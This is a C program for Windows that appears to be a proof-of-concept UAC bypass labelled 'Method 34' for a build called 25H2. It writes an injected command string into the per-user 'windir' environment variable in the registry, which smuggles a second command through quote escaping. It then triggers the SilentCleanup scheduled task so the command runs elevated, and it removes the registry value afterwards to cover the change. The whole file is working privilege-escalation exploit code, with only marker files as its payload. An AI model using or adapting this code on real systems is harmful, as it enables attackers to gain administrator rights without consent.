#include <windows.h>
#include <stdio.h>

int main() {
    // Fixed payload with quote escape for 25H2
    const char* payload = "cmd.exe\" /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA METHOD 34 ON 25H2 > C:\\uac_bypassed.txt & echo Success at %date% %time% >> C:\\uac_bypassed.txt & timeout 10\"";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "windir", 0, REG_EXPAND_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
        RegCloseKey(hKey);
    }

    // Trigger
    system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");

    Sleep(12000);  // Longer wait for 25H2 task delay

    // Cleanup
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "windir");
        RegCloseKey(hKey);
    }

    printf("[+] Method 34 triggered. Check C:\\ files now.\n");
    return 0;
}
